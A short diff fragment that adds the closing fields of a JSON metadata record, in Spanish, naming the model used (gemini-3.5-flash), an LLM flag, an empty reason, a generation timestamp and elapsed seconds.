+  "modelo": "gemini/gemini-3.5-flash",
+  "con_llm": true,
+  "motivo": "",
+  "generado_en": "2026-11-08T00:56:12.305241+00:00",
+  "segundos": 149.4
+}
